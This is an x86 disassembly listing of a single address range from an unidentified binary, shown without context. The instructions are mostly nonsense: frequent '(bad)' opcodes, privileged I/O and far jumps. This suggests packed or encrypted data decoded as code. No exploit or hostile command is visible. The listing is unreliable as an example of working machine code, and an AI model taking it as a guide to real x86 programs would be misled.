  41a6c1:	jo     0x41a6b9
  41a6c3:	arpl   WORD PTR [eax],bx
  41a6c5:	add    ebp,DWORD PTR [esi+0x13]
  41a6c8:	mov    bh,0xe5
  41a6ca:	dec    ebx
  41a6cb:	or     bl,BYTE PTR [esi]
  41a6cd:	idiv   BYTE PTR [ecx+0x7f0b063f]
  41a6d3:	rcr    cl,0x5
  41a6d6:	mov    al,0x8
  41a6d8:	stc    
  41a6d9:	mov    esi,0x40aea05d
  41a6de:	or     edi,esp
  41a6e0:	lds    edi,FWORD PTR [ecx]
  41a6e2:	or     edi,DWORD PTR [eax]
  41a6e4:	rcr    dh,cl
  41a6e6:	sar    ch,1
  41a6e8:	imul   esp,ebx,0x9ca624e
  41a6ee:	pop    ebp
  41a6ef:	iret   
  41a6f0:	xchg   edx,eax
  41a6f1:	cli    
  41a6f2:	fisttp WORD PTR [edx-0x5]
  41a6f5:	int    0x88
  41a6f7:	or     ebx,DWORD PTR [eax+0x7e]
  41a6fa:	rol    BYTE PTR [edi+0x17b874ce],0xbc
  41a701:	jecxz  0x41a76b
  41a703:	cmp    al,0x42
  41a705:	aad    0x59
  41a707:	push   ss
  41a708:	push   0x71
  41a70a:	jp     0x41a6cb
  41a70c:	inc    esp
  41a70d:	iret   
  41a70e:	(bad)
  41a711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a712:	or     al,0xfa
  41a714:	and    BYTE PTR [edi+ebp*2],dl
  41a717:	jnp    0x41a70e
  41a719:	pop    edx
  41a71a:	xor    dl,BYTE PTR [edx+esi*2]
  41a71d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a71e:	jne    0x41a76b
  41a720:	sbb    eax,0x1151c113
  41a725:	aad    0x8d
  41a727:	pop    ecx
  41a728:	idiv   edi
  41a72a:	cs fwait
  41a72c:	dec    esi
  41a72d:	add    BYTE PTR [eax],al
  41a72f:	add    BYTE PTR [eax],al
  41a731:	add    BYTE PTR [esi+0x6f],cl
  41a734:	je     0x41a75e
  41a736:	jne    0x41a773
  41a738:	pop    esi
  41a739:	outs   dx,DWORD PTR ds:[esi]
  41a73a:	out    dx,eax
  41a73b:	aaa    
  41a73c:	jae    0x41a716
  41a73e:	(bad)  
  41a73f:	mov    eax,0x23a99cdb
  41a744:	add    DWORD PTR [eax],eax
  41a746:	repz add al,0x0
  41a749:	add    BYTE PTR [edx-0xc],bl
  41a74c:	jl     0x41a795
  41a74e:	mov    ds:0xd7c9b52c,al
  41a753:	call   DWORD PTR [edi]
  41a755:	or     BYTE PTR [edi+0x1c6a2ef],bl
  41a75b:	mov    ebp,0x93de8502
  41a760:	int    0x73
  41a762:	jl     0x41a780
  41a764:	jmp    0x4ef9:0xe44d10f
  41a76b:	jbe    0x41a7ad
  41a76d:	in     al,0xfa
  41a76f:	leave  
  41a770:	xor    esi,DWORD PTR [eax]
  41a772:	jae    0x41a761
  41a774:	scas   al,BYTE PTR es:[edi]
  41a775:	mov    WORD PTR [ecx-0x38],fs
  41a778:	mov    ch,0x7f
  41a77a:	hlt    
  41a77b:	xchg   edx,eax
  41a77c:	push   ss
  41a77d:	out    dx,eax
  41a77e:	jle    0x41a736
  41a780:	lods   eax,DWORD PTR ds:[esi]
  41a781:	pop    es
  41a782:	das    
  41a783:	jge    0x41a77c
  41a785:	or     bh,cl
  41a787:	icebp  
  41a788:	push   edi
  41a789:	dec    esp
  41a78a:	out    0x8a,al
  41a78c:	mov    ebp,es
  41a78e:	or     eax,0x71e072c7
  41a793:	or     BYTE PTR [ebx+ecx*2],0x3e
  41a797:	sti    
  41a798:	scas   al,BYTE PTR es:[edi]
  41a799:	jl     0x41a756
  41a79b:	div    BYTE PTR [eax]
  41a79d:	ret    
  41a79e:	pop    esi
  41a79f:	aam    0x35
  41a7a1:	push   ecx
  41a7a2:	ss pusha 
  41a7a4:	loopne 0x41a7a7
  41a7a6:	cdq    
  41a7a7:	out    0xd8,al
  41a7a9:	pop    ss
  41a7aa:	or     esi,ebp
  41a7ac:	fld    DWORD PTR [ecx-0x24]
  41a7af:	ret    
  41a7b0:	add    esi,edx
  41a7b2:	sbb    al,0x1e
  41a7b4:	push   esp
  41a7b5:	sahf   
  41a7b6:	mov    esi,0x11dec13d
  41a7bb:	test   BYTE PTR [edi+0x52],ah
  41a7be:	mov    ah,0xd2
  41a7c0:	xchg   ecx,eax
  41a7c1:	das    
  41a7c2:	ds sahf 
  41a7c4:	cmc    
  41a7c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7c6:	sbb    eax,0x4d577647
  41a7cb:	push   esp
  41a7cc:	in     al,0xb3
  41a7ce:	jb     0x41a7a2
  41a7d0:	cmp    eax,0x65cb32c7
  41a7d5:	into   
  41a7d6:	stos   DWORD PTR es:[edi],eax
  41a7d7:	nop
  41a7d8:	sbb    DWORD PTR [ebx],ebp
  41a7da:	out    0x3c,eax
  41a7dc:	(bad)  
  41a7dd:	aad    0x81
  41a7df:	sbb    al,0x36
  41a7e1:	mov    edi,0xde2344be
  41a7e6:	sub    eax,0x4ebe72fc
  41a7eb:	pop    edi
  41a7ec:	enter  0xb6aa,0x84
  41a7f0:	sub    eax,0xc25b78ad
  41a7f5:	cmp    esi,DWORD PTR [ecx+ecx*8+0x561ce712]
  41a7fc:	cwde   
  41a7fd:	fidivr DWORD PTR [edx+0x841b09b]
  41a803:	xor    bh,dl
  41a805:	jle    0x41a7de
  41a807:	or     BYTE PTR [edi+0x5a],bl
  41a80a:	jmp    0x41a7d9
  41a80c:	sbb    DWORD PTR [ecx+ebp*8],edi
  41a80f:	push   eax
  41a810:	call   0x149c90b3
  41a815:	mov    eax,ds:0x70532bab
  41a81a:	ret    
  41a81b:	push   edx
  41a81c:	(bad)  
  41a81d:	retf   0x4096
  41a820:	fdiv   QWORD PTR [eax]
  41a822:	or     DWORD PTR [ebx-0x2b],0x41
  41a826:	int    0xa6
  41a828:	pop    ecx
  41a829:	adc    BYTE PTR [esi-0x329ef164],0x27
  41a830:	mov    ch,BYTE PTR [ecx]
  41a832:	sub    DWORD PTR ss:[edi],ecx
  41a835:	out    0x68,eax
  41a837:	jp     0x41a852
  41a839:	int    0x4b
  41a83b:	lahf   
  41a83c:	sbb    ebp,edx
  41a83e:	add    ebp,DWORD PTR [esp+edi*4]
  41a841:	je     0x41a815
  41a843:	sbb    eax,0xe551c419
  41a848:	dec    ebp
  41a849:	xor    DWORD PTR [eax+0x1a2a7a62],0x7c
  41a850:	pop    edi
  41a851:	adc    BYTE PTR [ebx],dl
  41a853:	sti    
  41a854:	loopne 0x41a850
  41a856:	jmp    DWORD PTR [eax+0x7b]
  41a859:	out    dx,eax
  41a85a:	in     eax,0xc2
  41a85c:	(bad)  
  41a85d:	dec    esp
  41a85e:	jg     0x41a899
  41a860:	test   dl,0x58
  41a863:	test   DWORD PTR [edx+0x27858fa7],ebp
  41a869:	outs   dx,DWORD PTR ds:[esi]
  41a86a:	push   edi
  41a86b:	push   ds
  41a86c:	mov    bh,0x71
  41a86e:	inc    eax
  41a86f:	lods   eax,DWORD PTR ds:[esi]
  41a870:	imul   edi,DWORD PTR [esi+0x7f],0xfffffff2
  41a874:	adc    ch,ah
  41a876:	arpl   dx,di
  41a878:	imul   ebx,eax,0x57
  41a87b:	mov    DWORD PTR [edi],ebx
  41a87d:	call   0xe1b477d8
  41a882:	mov    al,ds:0x1da22cc7
  41a887:	cdq    
  41a888:	outs   dx,DWORD PTR ds:[esi]
  41a889:	in     eax,dx
  41a88a:	and    DWORD PTR [eax+esi*2+0x41],esi
  41a88e:	sbb    al,0x54
  41a890:	xor    ecx,esp
  41a892:	add    ecx,DWORD PTR [esi]
  41a894:	mov    eax,ds:0xa50c18a
  41a899:	sbb    bl,bl
  41a89b:	test   eax,0x9f80feab
  41a8a0:	(bad)  [edx+0x290a5fcd]
  41a8a6:	sbb    eax,0xf4d29f14
  41a8ab:	mov    ebx,DWORD PTR [esp]
  41a8ae:	sub    dl,bh
  41a8b0:	sub    al,0x7b
  41a8b2:	fwait
  41a8b3:	out    dx,al
  41a8b4:	dec    ebp
  41a8b5:	je     0x41a883
  41a8b7:	xlat   BYTE PTR ds:[ebx]
  41a8b8:	dec    esi
  41a8b9:	repz fwait
  41a8bb:	add    bl,dh
  41a8bd:	xchg   DWORD PTR [esp+eiz*2+0x48646825],eax
  41a8c4:	mov    ds:0xfa8ccb03,al
  41a8c9:	clc    
  41a8ca:	mov    ds:0x10578564,al
  41a8cf:	fadd   DWORD PTR [ebx]
  41a8d1:	arpl   WORD PTR [ecx-0x7015954a],si
  41a8d7:	shr    DWORD PTR [ebp-0x3e],cl
  41a8da:	or     DWORD PTR [edi-0x44fc567d],ebp
  41a8e0:	out    dx,eax
  41a8e1:	sbb    eax,0x1c725df4
  41a8e6:	mov    ds:0xa12cef65,eax
  41a8eb:	sbb    BYTE PTR [edi],cl
  41a8ed:	cmp    ebp,0xcb05bc44
  41a8f3:	(bad)  
  41a8f4:	fild   QWORD PTR [esi-0x51]
  41a8f7:	mov    al,ds:0xda06e6e6
  41a8fc:	mov    ebx,0xf8d74c1b
  41a901:	dec    edi
  41a902:	out    dx,eax
  41a903:	pop    ss
  41a904:	scas   eax,DWORD PTR es:[edi]
  41a905:	imul   edx,edi,0x5a
  41a908:	add    DWORD PTR [ecx+0x42b78c1d],0xe188302b
  41a912:	mov    ecx,DWORD PTR [edx+0x35d9d7a3]
  41a918:	(bad)  
  41a919:	mov    ebx,0x48d9cad9
  41a91e:	rcl    esi,0xfe
  41a921:	ret    
  41a922:	and    dh,0xdc
  41a925:	outs   dx,DWORD PTR ds:[esi]
  41a926:	addr16 jb 0x41a902
  41a929:	(bad)  
  41a92b:	inc    edx
  41a92c:	retf   
  41a92d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a92e:	mov    ebx,0xd7b211a3
  41a933:	sub    eax,0x5348e939
  41a938:	div    BYTE PTR [ecx+0x1b]
  41a93b:	cmp    ah,al
  41a93d:	push   ebx
  41a93e:	cwde   
  41a93f:	fmul   st,st(3)
  41a941:	sub    ecx,DWORD PTR [esi]
  41a943:	sub    eax,0x9847bebb
  41a948:	iret   
  41a949:	pop    ebx
  41a94a:	pop    ds
  41a94b:	dec    esp
  41a94c:	inc    eax
  41a94d:	nop
  41a94e:	adc    esi,ecx
  41a950:	in     eax,dx
  41a951:	push   ecx
  41a952:	out    dx,eax
  41a953:	mov    ds:0xbdb1be98,eax
  41a958:	sar    BYTE PTR ds:0x69df9c76,1
  41a95e:	jmp    0x41a935
  41a960:	clc    
  41a961:	jge    0x41a8e3
  41a963:	push   edx
  41a964:	xor    BYTE PTR [edx+eiz*4+0x3f],ch
  41a968:	jbe    0x41a95f
  41a96a:	sub    esi,ecx
  41a96c:	jmp    0xb5921e9
  41a971:	adc    BYTE PTR [ebx],0xc2
  41a974:	cmp    ecx,DWORD PTR [ebx]
  41a976:	or     dl,BYTE PTR [ecx+0x37d71860]
  41a97c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a97d:	aam    0xfe
  41a97f:	sub    DWORD PTR [edi],ecx
  41a981:	in     al,0x34
  41a983:	or     al,0x98
  41a985:	and    cl,BYTE PTR ds:0x74e36128
  41a98b:	jnp    0x41a9ed
  41a98d:	push   edx
  41a98e:	scas   al,BYTE PTR es:[edi]
  41a98f:	retf   
  41a990:	pop    ecx
  41a991:	les    ecx,FWORD PTR [ebx+0x77]
  41a994:	cmp    al,0x67
  41a996:	mov    cl,0x26
  41a998:	add    BYTE PTR [ebp+esi*8-0x8],bl
  41a99c:	ins    BYTE PTR es:[edi],dx
  41a99d:	dec    ecx
  41a99e:	sahf   
  41a99f:	or     BYTE PTR [eax-0x39766e7d],0xd0
  41a9a6:	call   0xf779:0x209395ff
  41a9ad:	scas   al,BYTE PTR es:[edi]
  41a9ae:	bound  ebx,QWORD PTR [esi+0x20]
  41a9b1:	in     al,0x4
  41a9b3:	aas    
  41a9b4:	push   edx
  41a9b5:	or     dl,al
  41a9b7:	scas   al,BYTE PTR es:[edi]
  41a9b8:	or     ah,BYTE PTR [ecx+0x39]
  41a9bb:	lea    edx,[esi]
  41a9bd:	bound  esp,QWORD PTR [ebx]
  41a9bf:	jle    0x41a98b
  41a9c1:	rol    dh,cl
  41a9c3:	fstp   DWORD PTR [edx+0x6d]
  41a9c6:	dec    DWORD PTR [esi-0x79e0295e]
  41a9cc:	mov    WORD PTR [edx],gs
  41a9ce:	dec    edx
  41a9cf:	ret    
  41a9d0:	je     0x41aa17
  41a9d2:	xor    BYTE PTR [eax-0x7f3ae2f],dh
  41a9d8:	int    0x75
  41a9da:	maxps  xmm7,XMMWORD PTR [edi-0x12da93ce]
  41a9e1:	mov    al,0xcb
  41a9e3:	xchg   esi,eax
  41a9e4:	(bad)  
  41a9e5:	mov    eax,ds:0x99c4eb71
  41a9ea:	aad    0x8b
  41a9ec:	dec    esp
  41a9ed:	add    bl,BYTE PTR [ebp-0x64]
  41a9f0:	or     eax,0x9de4b446
  41a9f5:	ja     0x41a9cd
  41a9f7:	cmp    eax,0x4146d865
  41a9fc:	xchg   esp,eax
  41a9fd:	xlat   BYTE PTR ds:[ebx]
  41a9fe:	es mov ebp,0x550611d4
  41aa04:	stos   DWORD PTR es:[edi],eax
  41aa05:	ins    BYTE PTR es:[edi],dx
  41aa06:	fcmovnb st,st(7)
  41aa08:	sbb    edx,DWORD PTR [edi+0x1d77e377]
  41aa0e:	add    bl,al
  41aa10:	adc    esi,DWORD PTR [edi+0x69]
  41aa13:	rcl    edx,cl
  41aa15:	mov    esp,0xae307ead
  41aa1a:	stos   DWORD PTR es:[edi],eax
  41aa1b:	fmulp  st(5),st
  41aa1d:	mov    ebx,0x49ee09af
  41aa22:	test   DWORD PTR [edx],eax
  41aa24:	xchg   ecx,eax
  41aa25:	mov    bh,0x8
  41aa27:	sbb    cl,BYTE PTR [ebx-0x5e]
  41aa2a:	adc    BYTE PTR [edi+edx*4],bh
  41aa2d:	mov    ah,0xea
  41aa2f:	mov    edx,0xf02a4bf1
  41aa34:	int    0xf0
  41aa36:	push   cs
  41aa37:	push   edx
  41aa38:	test   al,0xe5
  41aa3a:	mov    ebx,0xe17d9289
  41aa3f:	mov    edx,0xa8947978
  41aa44:	ds sub eax,0xe23aa308
  41aa4a:	mov    ds:0x12b911ba,al
  41aa4f:	mov    al,ds:0x94b532a6
  41aa54:	or     ch,BYTE PTR [ebx-0x2e315d0f]
  41aa5a:	dec    ebx
  41aa5b:	mov    ds:0xc585be37,al
  41aa60:	jnp    0x41aad8
  41aa62:	(bad)  
  41aa63:	scas   al,BYTE PTR es:[edi]
  41aa64:	gs mov ebx,0x3b42bbed
  41aa6a:	int    0x8f
  41aa6c:	push   ss
  41aa6d:	test   al,0x31
  41aa6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa70:	add    eax,DWORD PTR [ebx]
  41aa72:	(bad)  
  41aa73:	and    al,0x8f
  41aa75:	adc    BYTE PTR [edx],bh
  41aa77:	or     esi,DWORD PTR ds:0xc617479d
  41aa7d:	xor    BYTE PTR ss:[edi+eiz*2-0x2aa06e1e],cl
  41aa85:	or     al,al
  41aa87:	sub    ebx,DWORD PTR [esi-0x7f5edd28]
  41aa8d:	adc    DWORD PTR [edi],ebp
  41aa8f:	and    al,0x6c
  41aa91:	retf   0x6708
  41aa94:	pop    esi
  41aa95:	data16 into 
  41aa97:	std    
  41aa98:	popf   
  41aa99:	loope  0x41aa9d
  41aa9b:	repnz push cs
  41aa9d:	ja     0x41aac2
  41aa9f:	cli    
  41aaa0:	jle    0x41aabc
  41aaa2:	cli    
  41aaa3:	fnstcw WORD PTR [eax-0x42]
  41aaa6:	int    0x7a
  41aaa8:	push   DWORD PTR [edi-0x2ef0cf0c]
  41aaae:	push   ebx
  41aaaf:	scas   al,BYTE PTR es:[edi]
  41aab0:	mov    ds,esi
  41aab2:	jb     0x41aac7
  41aab4:	imul   ebp,DWORD PTR [ebx-0x69],0xffffffbf
  41aab8:	mov    ebp,0x949d133f
  41aabd:	and    DWORD PTR [edi-0x5d],ecx
  41aac0:	cdq    
  41aac1:	cmp    dh,BYTE PTR [esp+ebx*1+0x79]
  41aac5:	retf   0x2323
  41aac8:	(bad)  
  41aac9:	dec    edx
  41aaca:	aaa    
  41aacb:	cdq    
  41aacc:	and    edx,ebp
  41aace:	pop    ebp
  41aacf:	dec    DWORD PTR [eax]
  41aad1:	in     al,0xb5
  41aad3:	jp     0x41aac5
  41aad5:	ds jle 0x41aaac
  41aad8:	mov    al,ds:0x364d51df
  41aadd:	push   edi
  41aade:	(bad)  
  41aadf:	pop    ds
  41aae0:	ss mov dl,dh
  41aae3:	aam    0xdc
  41aae5:	repnz sbb DWORD PTR [ecx],ecx
  41aae8:	adc    BYTE PTR [esp+eiz*4-0x29],ch
  41aaec:	cmp    ecx,eax
  41aaee:	stos   DWORD PTR es:[edi],eax
  41aaef:	sbb    dh,BYTE PTR [ebx+0x48]
  41aaf2:	pusha  
  41aaf3:	out    dx,eax
  41aaf4:	and    dl,BYTE PTR ss:[ebx+edx*1+0x7b91d421]
  41aafc:	dec    esp
  41aafd:	or     dh,BYTE PTR [ebp+0x3b]
  41ab00:	xor    DWORD PTR [edi-0x77732431],ecx
  41ab06:	popa   
  41ab07:	cmp    ebx,DWORD PTR [ecx+0x2e9e0e53]
  41ab0d:	cld    
  41ab0e:	push   esi
  41ab0f:	fadd   QWORD PTR [ebp+0x551e9216]
  41ab15:	pushf  
  41ab16:	xor    al,dh
  41ab18:	inc    edx
  41ab19:	pop    ecx
  41ab1a:	test   DWORD PTR [edi+0x81449fb],ecx
  41ab20:	imul   esp,DWORD PTR [ecx-0x29],0x8551bb8e
  41ab27:	mov    WORD PTR [edx+ebx*4+0x7f],cs
  41ab2b:	rol    BYTE PTR [edi-0x38],1
  41ab2e:	sbb    bl,BYTE PTR [esi+0x4adfc1f7]
  41ab34:	bound  esp,QWORD PTR [eax]
  41ab36:	dec    ecx
  41ab37:	pop    esi
  41ab38:	jecxz  0x41aad0
  41ab3a:	add    ah,BYTE PTR [edx+0x8]
  41ab3d:	bound  ebx,QWORD PTR [edx]
  41ab3f:	sbb    BYTE PTR [esi-0x5d4bf129],cl
  41ab45:	xor    bh,BYTE PTR [ebp-0x45203d7c]
  41ab4b:	fisttp WORD PTR [edi+0x7f]
  41ab4e:	ins    DWORD PTR es:[edi],dx
  41ab4f:	mov    ebp,DWORD PTR [edx+0x769b2b3a]
  41ab55:	mov    DWORD PTR [eax+0xe930266],esi
  41ab5b:	xor    esi,DWORD PTR [edi+eiz*2-0x31]
  41ab5f:	jmp    0x18a8bf4d
  41ab64:	xchg   ebx,eax
  41ab65:	sub    ebp,DWORD PTR [ebx+0x64]
  41ab68:	imul   eax,DWORD PTR [ecx-0x62],0x10a12483
  41ab6f:	xchg   edx,eax
  41ab70:	adc    DWORD PTR [ecx+edi*8],edx
  41ab73:	out    dx,eax
  41ab74:	sbb    ah,BYTE PTR ds:0x95cc4db5
  41ab7a:	xchg   ecx,eax
  41ab7b:	push   0xd89d6c7d
  41ab80:	inc    esi
  41ab81:	push   ebp
  41ab82:	jae    0x41abbe
  41ab84:	xchg   esi,eax
  41ab85:	sub    edx,DWORD PTR [edx]
  41ab87:	(bad)  
  41ab88:	sub    eax,0x1923c815
  41ab8d:	rcr    BYTE PTR [ecx],cl
  41ab8f:	out    0x3c,eax
  41ab91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab92:	out    0xf6,eax
  41ab94:	lods   eax,DWORD PTR ds:[esi]
  41ab95:	pop    es
  41ab96:	or     edi,DWORD PTR [edi+0x6bae5333]
  41ab9c:	lds    ebx,FWORD PTR [ecx+esi*2]
  41ab9f:	jl     0x41ab9c
  41aba1:	mov    ah,0x73
  41aba3:	adc    bl,BYTE PTR [ecx+0x5d]
  41aba6:	jns    0x41abfa
  41aba8:	mov    bl,0x27
  41abaa:	sub    eax,edx
  41abac:	int3   
  41abad:	sti    
  41abae:	xchg   BYTE PTR [ebp+0x17],dl
  41abb1:	call   0x15217bbd
  41abb6:	dec    ecx
  41abb7:	hlt    
  41abb8:	jmp    0x418688fe
  41abbd:	adc    eax,0xad9d7af3
  41abc2:	xchg   esi,eax
  41abc3:	cld    
  41abc4:	cwde   
  41abc5:	or     dl,BYTE PTR [edi-0x3b7af836]
  41abcb:	sub    dh,BYTE PTR [edx-0x2b]
  41abce:	outs   dx,DWORD PTR ds:[esi]
  41abcf:	sub    ebx,esp
  41abd1:	jl     0x41ac0f
  41abd3:	mov    edi,0xf7037d9b
  41abd8:	das    
  41abd9:	lea    esp,[esi+ebp*8+0x7f]
  41abdd:	fistp  QWORD PTR [ecx-0x3c]
  41abe0:	ret    
  41abe1:	fiadd  DWORD PTR [ebx-0x79]
  41abe4:	retf   0xd3fc
  41abe7:	loop   0x41ac54
  41abe9:	pop    ebp
  41abea:	aaa    
  41abeb:	inc    ebx
  41abec:	(bad)
  41abef:	daa    
  41abf0:	sub    eax,0xcdbe347b
  41abf5:	call   0xacf6cc03
  41abfa:	retf   0xb4d6
  41abfd:	inc    ecx
  41abfe:	add    DWORD PTR [ecx-0xb3dce62],ebp
  41ac04:	pop    ss
  41ac05:	mov    ch,BYTE PTR [ecx]
  41ac07:	scas   eax,DWORD PTR es:[edi]
  41ac08:	pop    eax
  41ac09:	mov    edx,DWORD PTR [edi]
  41ac0b:	test   DWORD PTR [edx+0x3b],esi
  41ac0e:	cld    
  41ac0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac10:	xor    ebx,edx
  41ac12:	das    
  41ac13:	cwde   
  41ac14:	sahf   
  41ac15:	xchg   ebp,eax
  41ac16:	mov    cl,0x3b
  41ac18:	pop    ss
  41ac19:	outs   dx,BYTE PTR ds:[esi]
  41ac1a:	loopne 0x41ab9f
  41ac1c:	retf   
  41ac1d:	lods   eax,DWORD PTR ds:[esi]
  41ac1e:	fs std 
  41ac20:	xlat   BYTE PTR ds:[ebx]
  41ac21:	lods   eax,DWORD PTR ds:[esi]
  41ac22:	sub    ecx,esp
  41ac24:	push   cs
  41ac25:	pop    ss
  41ac26:	xor    DWORD PTR [ebp-0x13a84f67],ebx
  41ac2c:	lea    eax,ss:[eax-0x24]
  41ac30:	fsub   DWORD PTR [ebx+0x672c68cd]
  41ac36:	outs   dx,DWORD PTR ds:[esi]
  41ac37:	ja     0x41abd4
  41ac39:	(bad)  
  41ac3a:	(bad)  
  41ac3b:	enter  0x60,0x0
  41ac3f:	add    BYTE PTR [eax],al
  41ac41:	add    BYTE PTR [ebp+0x4d],cl
  41ac44:	ss retf 0xfb36
  41ac48:	std    
  41ac49:	iret   
  41ac4a:	cmp    esp,DWORD PTR [edx]
  41ac4c:	(bad)  
  41ac4d:	cld    
  41ac4e:	mov    al,ds:0x9cf3c6e6
  41ac53:	sub    BYTE PTR [ecx],al
  41ac55:	add    bl,dh
  41ac57:	add    al,0x0
  41ac59:	add    BYTE PTR [ebx+0x3b],al
  41ac5c:	dec    edi
  41ac5d:	mov    dh,0xc2
  41ac5f:	and    ch,ah
  41ac61:	mov    bl,BYTE PTR [esi+0x2e0d22f5]
  41ac67:	dec    esp
  41ac68:	enter  0xeb77,0x5c
  41ac6c:	aaa    
  41ac6d:	test   eax,0xfce6b968
  41ac72:	pop    ds
  41ac73:	add    ch,BYTE PTR [ebx]
  41ac75:	aad    0x40
  41ac77:	pop    edi
  41ac78:	scas   al,BYTE PTR es:[edi]
  41ac79:	loope  0x41ac75
  41ac7b:	imul   ecx,esi,0x6c
  41ac7e:	mov    al,ds:0x81bcb436
  41ac83:	fdivr  st(6),st
  41ac85:	mov    WORD PTR [edi+eax*1],es
  41ac88:	mov    dh,0x7
  41ac8a:	pop    ecx
  41ac8b:	out    dx,eax
  41ac8c:	mov    ah,ah
  41ac8e:	push   ebx
  41ac8f:	inc    ebp
  41ac90:	jg     0x41ac55
  41ac92:	xor    BYTE PTR [ebx],bh
  41ac94:	jecxz  0x41acd7
  41ac96:	xor    DWORD PTR [esi-0x48],edi
  41ac99:	jecxz  0x41ac5b
  41ac9b:	(bad)  
  41ac9c:	jg     0x41ac51
  41ac9e:	(bad)  
  41ac9f:	sbb    cl,BYTE PTR [esi-0x38f08874]
  41aca5:	add    al,0xf7
  41aca7:	adc    BYTE PTR [eax+0x44177b32],dl
  41acad:	inc    esi
  41acae:	mov    WORD PTR [ecx+edi*2+0x1c155310],ds
  41acb5:	aad    0x19
  41acb7:	std    
  41acb8:	mov    ah,0xf4
  41acba:	jecxz  0x41ad0a
  41acbc:	mov    al,ds:0x7a8c506e
  41acc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acc2:	inc    edx
  41acc3:	arpl   WORD PTR [eax],dx
  41acc5:	lods   eax,DWORD PTR ds:[esi]
  41acc6:	loopne 0x41ace0
  41acc8:	call   0x99b1:0xfbbf038b
  41accf:	loop   0x41ac5e
  41acd1:	fucomi st,st(2)
  41acd3:	or     al,0x8a
  41acd5:	sub    BYTE PTR [edi+0x593cc6b7],bh
  41acdb:	fbld   TBYTE PTR ds:0x2d07ad2e
  41ace1:	inc    ebp
  41ace2:	sub    DWORD PTR [esi-0x272c3773],0xffffff85
  41ace9:	or     eax,0x828d21c
  41acee:	mov    ?,WORD PTR [edx]
  41acf0:	push   0xd17dbf48
  41acf5:	mov    ds:0x2297e22e,al
  41acfa:	cdq    
  41acfb:	ds mov ebp,0xfe661a0b
  41ad01:	xor    BYTE PTR [esi+ebp*4],ah
  41ad04:	xchg   DWORD PTR [edx+0x7979e538],ebp
  41ad0a:	add    BYTE PTR [ebx-0x9],dh
  41ad0d:	push   0x26
  41ad0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad10:	jae    0x41ad33
  41ad12:	inc    ebp
  41ad13:	add    ebx,DWORD PTR [ebx+eax*8+0x15]
  41ad17:	out    0xbd,al
  41ad19:	(bad)  
  41ad1a:	push   0x73
  41ad1c:	ins    DWORD PTR es:[edi],dx
  41ad1d:	push   ebx
  41ad1e:	cmp    DWORD PTR [edi+eax*8+0x9],ebx
  41ad22:	mov    ebp,ebx
  41ad24:	mov    dl,0xa9
  41ad26:	and    dl,BYTE PTR [ebx+eax*4+0x18c65c7e]
  41ad2d:	in     al,0xb
  41ad2f:	ficomp WORD PTR [edi-0x1a]
  41ad32:	stos   BYTE PTR es:[edi],al
  41ad33:	cmp    eax,ebp
  41ad35:	sub    eax,0x9254af9a
  41ad3a:	sbb    DWORD PTR [esi],edx
  41ad3c:	and    edi,DWORD PTR ds:0x4555d2ad
  41ad42:	outs   dx,DWORD PTR ds:[esi]
  41ad43:	lds    esi,FWORD PTR [ecx]
  41ad45:	pop    esi
  41ad46:	dec    ebx
  41ad47:	xchg   BYTE PTR [ecx],cl
  41ad49:	jne    0x41ad4a
  41ad4b:	les    ecx,FWORD PTR [edx]
  41ad4d:	xchg   esi,eax
  41ad4e:	push   ebp
  41ad4f:	adc    bh,BYTE PTR [ecx*8+0x484ed0c5]
  41ad56:	and    DWORD PTR [edx],ecx
  41ad58:	inc    ebx
  41ad59:	das    
  41ad5a:	cmp    al,0xbf
  41ad5c:	into   
  41ad5d:	call   0xb7f2e38e
  41ad62:	jbe    0x41ad57
  41ad64:	imul   eax,DWORD PTR [ebp-0x558ab439],0x2ac24a8c
  41ad6e:	sub    edi,ebx
  41ad70:	mov    bl,0xed
  41ad72:	mov    ch,0xa5
  41ad74:	out    0x31,al
  41ad76:	in     al,dx
  41ad77:	shl    dl,cl
  41ad79:	cmp    ebp,DWORD PTR [esi+0x300261ff]
  41ad7f:	push   edi
  41ad80:	inc    edi
  41ad81:	dec    esi
  41ad82:	scas   al,BYTE PTR es:[edi]
  41ad83:	push   ecx
  41ad84:	ja     0x41ad37
  41ad86:	pop    edx
  41ad87:	fisubr WORD PTR [edx-0x54c81d43]
  41ad8d:	sbb    esp,DWORD PTR [edx+ebp*4]
  41ad90:	fistp  QWORD PTR [edi]
  41ad92:	and    al,0x9e
  41ad94:	mov    dl,0x68
  41ad96:	inc    eax
  41ad97:	jne    0x41ad5c
  41ad99:	int    0x94
  41ad9b:	iret   
  41ad9c:	xor    bl,BYTE PTR ds:0xd8973b67
  41ada2:	cli    
  41ada3:	mov    eax,0xe60e2992
  41ada8:	in     al,dx
  41ada9:	repz mov bh,ch
  41adac:	xchg   DWORD PTR [edx-0x70d37f2],esi
  41adb2:	dec    esi
  41adb3:	out    dx,eax
  41adb4:	jne    0x41ad41
  41adb6:	push   edi
  41adb7:	fdiv   DWORD PTR [edx-0xc]
  41adba:	sub    dh,BYTE PTR [ebp+0x15]
  41adbd:	xchg   ecx,eax
  41adbe:	int3   
  41adbf:	das    
  41adc0:	dec    edi
  41adc1:	cdq    
  41adc2:	mov    ds:0x31a623bc,eax
  41adc7:	loope  0x41ae27
  41adc9:	xor    al,0xd5
  41adcb:	or     DWORD PTR [esi-0x32498521],edi
  41add1:	inc    esp
  41add2:	ret    
  41add3:	or     esp,edx
  41add5:	dec    ecx
  41add6:	adc    DWORD PTR [edx],edi
  41add8:	add    eax,0xf5d2361
  41addd:	outs   dx,DWORD PTR ds:[esi]
  41adde:	mov    bh,0xbc
  41ade0:	sub    DWORD PTR [edi+0x39],edi
  41ade3:	stc    
  41ade4:	mov    al,0x12
  41ade6:	sub    al,0xa9
  41ade8:	outs   dx,BYTE PTR ds:[esi]
  41ade9:	jmp    0x41ae14
  41adeb:	(bad)  
  41adec:	sbb    BYTE PTR [ebp-0x213fc3d],bl
  41adf2:	jo     0x41ad9b
  41adf4:	mov    dl,0xc8
  41adf6:	pop    ebp
